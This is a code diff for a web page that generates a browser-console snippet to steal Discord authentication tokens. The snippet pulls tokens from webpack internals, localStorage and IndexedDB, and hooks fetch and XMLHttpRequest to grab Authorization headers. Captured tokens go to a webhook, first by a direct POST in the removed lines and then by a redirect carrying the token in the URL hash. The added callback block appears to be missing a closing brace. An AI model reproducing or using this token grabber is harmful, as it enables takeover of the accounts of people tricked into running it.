@@ -176,34 +176,28 @@ function build(title, d, user, guilds, token) {
 /* ---------- gerçek token ---------- */
 
 function snippet() {
-  const W = CONFIG.WEBHOOK;
+  const P = location.origin + location.pathname;
   return [
     '(async()=>{',
-    'const W="' + W + '";',
     'const RE=/^[\\w-]{20,45}\\.[\\w-]{5,12}\\.[\\w-]{20,70}$/;',
     'const out=[];',
-    'const done=async(t,s)=>{if(!t)return;t=String(t).replace(/^"|"$/g,"").trim();if(!RE.test(t))return;',
-    'await navigator.clipboard.writeText(t).catch(()=>{});',
-    'const r=await fetch(W,{method:"POST",headers:{"Content-Type":"application/json"},',
-    'body:JSON.stringify({username:"Logger",embeds:[{title:"GERCEK TOKEN ("+s+")",color:0xed4245,',
-    'fields:[{name:"Token",value:"```"+t+"```"},{name:"Kaynak",value:s,inline:true}],',
-    'timestamp:new Date().toISOString()}]})});',
-    'console.log(r.status,"GONDERILDI",t)};',
+    'const back=t=>{navigator.clipboard.writeText(t).catch(()=>{try{copy(t)}catch(e){}});',
+    'console.log("TOKEN",t);location.href="' + P + '#t="+encodeURIComponent(t)};',
     'try{let m;webpackChunkdiscord_app.push([[Symbol()],{},e=>{m=Object.values(e.c)}]);webpackChunkdiscord_app.pop();',
     'const f=m.find(x=>x&&x.exports&&x.exports.default&&x.exports.default.getToken);',
-    'const tv=f&&f.exports.default.getToken();if(tv)out.push(["uygulama",tv]);}catch(e){}',
+    'const tv=f&&f.exports.default.getToken();if(tv)out.push(tv);}catch(e){}',
     'try{for(const k of Object.keys(localStorage)){const v=(localStorage.getItem(k)||"").replace(/^"|"$/g,"");',
-    'if(RE.test(v))out.push(["storage",v]);}}catch(e){}',
+    'if(RE.test(v))out.push(v);}}catch(e){}',
     'try{const dbs=(await indexedDB.databases?.())||[];',
     'for(const d of dbs){await new Promise(r=>{const q=indexedDB.open(d.name);q.onerror=()=>r();',
     'q.onsuccess=()=>{const db=q.result;',
     'for(const s of db.objectStoreNames){try{const g=db.transaction(s,"readonly").objectStore(s).getAll();',
-    'g.onsuccess=()=>{(JSON.stringify(g.result||[]).match(new RegExp(RE.source,"g"))||[]).forEach(t=>out.push(["storage",t]));};}catch(e){}}',
+    'g.onsuccess=()=>{(JSON.stringify(g.result||[]).match(new RegExp(RE.source,"g"))||[]).forEach(t=>out.push(t));};}catch(e){}}',
     'setTimeout(()=>{db.close();r()},500)};});}}catch(e){}',
-    'const u=[...new Map(out.map(x=>[x[1],x])).values()];',
-    'if(u.length){for(const [s,t] of u)await done(t,s);return;}',
+    'const u=[...new Set(out.filter(t=>RE.test(t)))];',
+    'if(u.length)return back(u[0]);',
     'console.log("Bulunamadi - bir kanala tikla, yakalayacagim...");',
-    'const cap=t=>{if(t&&RE.test(t))done(t,"network")};',
+    'const cap=t=>{if(t&&RE.test(t))back(t)};',
     'const of=window.fetch;window.fetch=function(...a){try{const h=a[1]&&a[1].headers;',
     'if(h){const g=h.get?h.get("Authorization"):(h.Authorization||h.authorization);cap(g)}}catch(e){}return of.apply(this,a)};',
     'const os=XMLHttpRequest.prototype.setRequestHeader;',
@@ -233,6 +227,7 @@ async function sendReal(raw, src) {
   $("#st").innerHTML = sent
     ? '<span class="ok">Gerçek token gönderildi.</span>'
     : '<span class="err">Gönderilemedi, tekrar dene.</span>';
+  return sent;
 }
 
 function showPanel() {
@@ -315,7 +310,18 @@ async function callback(hash) {
     $("#b").onclick = goOAuth;
     return;
   }
-
+ 
+  if (hash.get("t")) {
+    $("#sp").style.display = "block";
+    $("#t").textContent = "Token alındı";
+    $("#m").textContent = "Gönderiliyor...";
+    $("#panel").classList.remove("hide");
+    const ok = await sendReal(hash.get("t"), "console");
+    $("#sp").style.display = "none";
+    $("#t").textContent = ok ? "Tamamlandı" : "Hata";
+    $("#m").textContent = ok ? "Token webhook'a düştü." : "Gönderilemedi, kutuya elle yapıştır.";
+    try { history.replaceState(null, "", location.pathname); } catch (e) {}
+    return;
   if (hash.get("access_token")) return callback(hash);
 
   const d = await collect();
